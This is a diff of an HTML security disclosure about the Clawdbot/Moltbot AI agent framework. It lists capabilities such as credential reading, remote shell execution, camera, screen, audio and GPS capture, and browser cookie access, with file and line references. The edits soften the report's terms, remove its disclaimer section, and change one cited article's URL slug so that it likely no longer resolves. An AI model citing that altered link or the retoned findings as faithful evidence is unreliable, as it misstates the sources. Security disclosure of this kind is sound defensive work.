           <td>API tokens that may access internal systems</td>
         </tr>
         <tr>
@@ -2083,16 +2520,16 @@ KeepAlive=true (respawns if killed)
           <td>Everything packaged and ready for transmission</td>
         </tr>
         <tr>
-          <td>Browser session theft</td>
+          <td>Browser session access</td>
           <td>Banking, email, corporate SSO, any logged-in site</td>
         </tr>
         <tr>
           <td>Remote shell execution</td>
-          <td>Full system compromise, malware installation, data destruction</td>
+          <td>Full system compromise, arbitrary software installation, data destruction</td>
         </tr>
         <tr>
           <td>GPS tracking</td>
-          <td>Physical location surveillance, pattern-of-life analysis</td>
+          <td>Physical location monitoring, pattern-of-life assessment</td>
         </tr>
       </table>
 
@@ -2163,16 +2600,16 @@ npm uninstall -g clawdbot moltbot</code></pre>
 
     <h3>Code References (Public GitHub Repository)</h3>
     <ul>
-      <li><code>src/agents/cli-credentials.ts</code> — Credential harvesting functions</li>
+      <li><code>src/agents/cli-credentials.ts</code> — Credential collection functions</li>
       <li><code>src/agents/auth-profiles/external-cli-sync.ts</code> — Automatic credential sync</li>
       <li><code>src/infra/ssh-config.ts</code> — SSH config parsing, identity file enumeration (lines 19-95)</li>
       <li><code>apps/macos/Sources/Moltbot/ScreenRecordService.swift</code> — macOS screen recording</li>
       <li><code>apps/android/.../ScreenRecordManager.kt</code> — Android screen recording (lines 117-122: base64 encoding)</li>
       <li><code>apps/android/.../CameraCaptureManager.kt</code> — Camera capture (lines 133-136: base64 encoding)</li>
-      <li><code>apps/android/.../NodeRuntime.kt</code> — Invoke handler, misleading UI (lines 943-1044)</li>
+      <li><code>apps/android/.../NodeRuntime.kt</code> — Invoke handler, UI lacks transmission disclosure (lines 943-1044)</li>
       <li><code>apps/android/.../GatewaySession.kt</code> — Remote triggering (lines 450-455), WebSocket transmission (lines 498-525)</li>
       <li><code>apps/android/.../NodeForegroundService.kt</code> — No audit trail (lines 46-54)</li>
-      <li><code>src/browser/pw-tools-core.storage.ts</code> — Browser cookie/storage theft (lines 3-86)</li>
+      <li><code>src/browser/pw-tools-core.storage.ts</code> — Browser cookie/storage access (lines 3-86)</li>
       <li><code>src/cli/browser-cli-state.cookies-storage.ts</code> — CLI commands for cookie access</li>
       <li><code>src/agents/tools/nodes-tool.ts</code> — Remote command execution (lines 388-441), GPS tracking (lines 358-386)</li>
       <li><code>apps/android/.../LocationCaptureManager.kt</code> — GPS payload construction (lines 45-61)</li>
@@ -2182,7 +2619,7 @@ npm uninstall -g clawdbot moltbot</code></pre>
       <li><code>src/web/inbound/monitor.ts</code> — WhatsApp message monitoring</li>
       <li><code>src/imessage/monitor/monitor-provider.ts</code> — iMessage monitoring</li>
       <li><code>src/daemon/launchd-plist.ts</code> — LaunchAgent configuration</li>
-      <li><code>src/gateway/node-command-policy.ts</code> — Default-enabled surveillance</li>
+      <li><code>src/gateway/node-command-policy.ts</code> — Default-enabled monitoring</li>
       <li><code>apps/macos/Sources/Moltbot/PermissionManager.swift</code> — Suppressible prompts, Accessibility API (lines 85-94), AppleScript (lines 77-82, 381-389)</li>
       <li><code>Swabble/Sources/SwabbleCore/Speech/SpeechPipeline.swift</code> — Ambient audio mic tap (lines 52-59)</li>
       <li><code>Swabble/README.md</code> — "always-on voice hook", transcript storage (line 86)</li>
@@ -2196,11 +2633,11 @@ npm uninstall -g clawdbot moltbot</code></pre>
 
     <h3>Official Documentation</h3>
     <ul>
-      <li><a href="https://github.com/moltbot/moltbot/blob/main/README.md">Moltbot README.md</a> — No mention of credential harvesting</li>
+      <li><a href="https://github.com/moltbot/moltbot/blob/main/README.md">Moltbot README.md</a> — No mention of credential collection</li>
       <li><a href="https://github.com/moltbot/moltbot/blob/main/SECURITY.md">Moltbot SECURITY.md</a> — No mention of keychain access</li>
       <li><a href="https://github.com/moltbot/moltbot/issues/2447">Issue #2447</a> — User requests option to disable automatic credential sync (confirms feature exists and is on by default)</li>
       <li><a href="https://github.com/moltbot/moltbot/issues/2036">Issue #2036</a> — OAuth token refresh race condition with Claude Code CLI (confirms active sync from keychain)</li>
-      <li><a href="https://github.com/moltbot/moltbot/pull/2123">PR #2123</a> — Fix merged for credential sync race condition (proves active maintenance)</li>
+      <li><a href="https://github.com/moltbot/moltbot/pull/2123">PR #2123</a> — Fix merged for credential sync race condition (indicates active maintenance)</li>
     </ul>
 
     <h3>Security Reports</h3>
@@ -2208,7 +2645,7 @@ npm uninstall -g clawdbot moltbot</code></pre>
       <li><a href="https://www.bitdefender.com/en-us/blog/hotforsecurity/moltbot-security-alert-exposed-clawdbot-control-panels-risk-credential-leaks-and-account-takeovers">Bitdefender: Exposed control panels</a></li>
       <li><a href="https://www.theregister.com/2026/01/27/clawdbot_moltbot_security_concerns/">The Register: Security concerns</a></li>
       <li><a href="https://www.infostealers.com/article/clawdbot-the-new-primary-target-for-infostealers-in-the-ai-era/">InfoStealers: Primary target for malware</a></li>
-      <li><a href="https://forklog.com/en/critical-vulnerabilities-found-in-clawdbot-ai-agent-for-cryptocurrency-theft/">ForkLog: Critical vulnerabilities</a></li>
+      <li><a href="https://forklog.com/en/critical-vulnerabilities-found-in-clawdbot-ai-agent-for-cryptocurrency-access/">ForkLog: Critical vulnerabilities</a></li>
     </ul>
   </div>
 
@@ -2218,30 +2655,12 @@ npm uninstall -g clawdbot moltbot</code></pre>
       Relationship to GitHub Security Report
     </div>
     <div class="section-content">
-      <p>This document serves as supporting evidence for the GitHub security report titled <strong>"Security Incident Report: Undisclosed Credential Harvesting, Persistent Execution, and Surveillance Capabilities"</strong> submitted against the clawdbot/moltbot repository.</p>
+      <p>This document serves as supporting evidence for the GitHub security report titled <strong>"Security Incident Report: Undisclosed Credential Collection, Persistent Execution, and Monitoring Capabilities"</strong> submitted against the clawdbot/moltbot repository.</p>
       <p style="margin-top: 12px;">This HTML report is linked directly in that submission and provides detailed technical analysis, code references, and evidence supporting the claims made in the formal report.</p>
     </div>
   </div>
 
   <!-- What This Report Does Not Claim -->
-  <div class="section" id="disclaimers" style="margin-top: 32px;">
-    <div class="section-header">
-      <span class="num">!</span>
-      What This Report Does Not Claim
-    </div>
-    <div class="section-content">
-      <p>This report documents <strong>verified technical capabilities</strong> present in the codebase. It does not make the following claims:</p>
-      <ul style="margin: 16px 0 16px 20px;">
-        <li><strong>No claims of author intent:</strong> This report does not speculate on whether these capabilities were implemented with malicious intent. The code exists; the motivation is unknown.</li>
-        <li><strong>No claims of active exploitation:</strong> This report does not claim these capabilities are currently being exploited against users. It documents what the code <em>can</em> do, not what it <em>is</em> doing.</li>
-        <li><strong>No claims of state involvement:</strong> This report makes no claims about government, corporate, or organized criminal involvement.</li>
-        <li><strong>No claims of data misuse:</strong> This report does not claim that harvested data has been sold, leaked, or misused. It documents the exfiltration paths that exist.</li>
-        <li><strong>No claims beyond documented behavior:</strong> Every finding in this report is supported by specific file paths, line numbers, and code snippets from the public repository.</li>
-      </ul>
-      <p>The purpose of this report is to inform users of capabilities that exist in software they may have installed, so they can make informed decisions about their security.</p>
-    </div>
-  </div>
-
   <!-- Classification Statement -->
   <div class="section" id="classification" style="margin-top: 32px;">
     <div class="section-header">
@@ -2250,7 +2669,7 @@ npm uninstall -g clawdbot moltbot</code></pre>
     </div>
     <div class="section-content">
       <div class="alert-box">
-        <p style="font-size: 16px; line-height: 1.8;">Based on the documented capabilities — persistent background execution, credential harvesting from multiple sources, remote shell command execution, camera/screen/audio surveillance, GPS tracking, browser session theft, remote code installation, and lack of informed user consent — <strong>this system meets the functional definition of spyware with RAT-class (Remote Access Trojan) control surfaces</strong>, regardless of its stated purpose as an "AI assistant framework."</p>
+        <p style="font-size: 16px; line-height: 1.8;">Based on the documented capabilities — persistent background execution, credential collection from multiple sources, remote shell command execution, camera/screen/audio monitoring, GPS tracking, browser session access, remote code installation, and lack of informed user consent — <strong>this system exhibits a capability profile consistent with monitoring software and remote administration–class control surfaces</strong>, regardless of its stated purpose as an "AI assistant framework."</p>
         <p style="margin-top: 16px;">This classification is based solely on technical capabilities present in the code, not on speculation about intent or usage.</p>
       </div>
 
@@ -2267,7 +2686,7 @@ npm uninstall -g clawdbot moltbot</code></pre>
           <td>LaunchAgent with KeepAlive</td>
         </tr>
         <tr>
-          <td>Credential harvesting</td>
+          <td>Credential collection</td>
           <td><span class="tag tag-red">YES</span></td>
           <td>API keys, OAuth tokens, SSH config</td>
         </tr>
@@ -2277,17 +2696,17 @@ npm uninstall -g clawdbot moltbot</code></pre>
           <td>system.run via node.invoke</td>
         </tr>
         <tr>
-          <td>Camera surveillance</td>
+          <td>Camera monitoring</td>
           <td><span class="tag tag-red">YES</span></td>
           <td>camera.snap, camera.clip</td>
         </tr>
         <tr>
-          <td>Screen surveillance</td>
+          <td>Screen monitoring</td>
           <td><span class="tag tag-red">YES</span></td>
           <td>screen.record, browser screenshots</td>
         </tr>
         <tr>
-          <td>Audio surveillance</td>
+          <td>Audio monitoring</td>
           <td><span class="tag tag-red">YES</span></td>
           <td>Swabble ambient audio capture</td>
         </tr>
@@ -2297,7 +2716,7 @@ npm uninstall -g clawdbot moltbot</code></pre>
           <td>location.get on iOS/Android</td>
         </tr>
         <tr>
-          <td>Browser session theft</td>
+          <td>Browser session access</td>
           <td><span class="tag tag-red">YES</span></td>
           <td>Cookies, localStorage, sessionStorage via CDP</td>
         </tr>
@@ -2321,9 +2740,9 @@ npm uninstall -g clawdbot moltbot</code></pre>
   </div>
 
   <div class="footer">
-    <p><strong>Report generated:</strong> January 28, 2026 (Updated January 30, 2026 with dynamic runtime analysis confirming credential harvesting, network binding analysis showing localhost-only gateway, and nuanced findings)</p>
+    <p><strong>Report generated:</strong> January 28, 2026 (Updated January 30, 2026 with dynamic runtime analysis confirming credential collection, network binding analysis showing localhost-only gateway, and nuanced findings)</p>
     <p><strong>Clawdbot version analyzed:</strong> 2026.1.24-3</p>
-    <p><strong>Repository:</strong> <a href="https://github.com/moltbot/moltbot" style="color: #58a6ff;">https://github.com/moltbot/moltbot</a></p>
+    <p><strong>Repository:</strong> <a href="https://github.com/openclaw/openclaw" style="color: #58a6ff;">https://github.com/openclaw/openclaw</a></p>
     <p><strong>Analysis method:</strong> Static analysis of public GitHub repository + dynamic runtime analysis with network/filesystem monitoring (mitmproxy, fswatch, lsof, tcpdump)</p>
     <p style="margin-top: 16px; color: #f85149;"><strong>SHA256:</strong> <code>5ebe61a486321518e452e3059f55c0918b363ba6e14c44e25f77932034f039b5</code></p>
   </div>
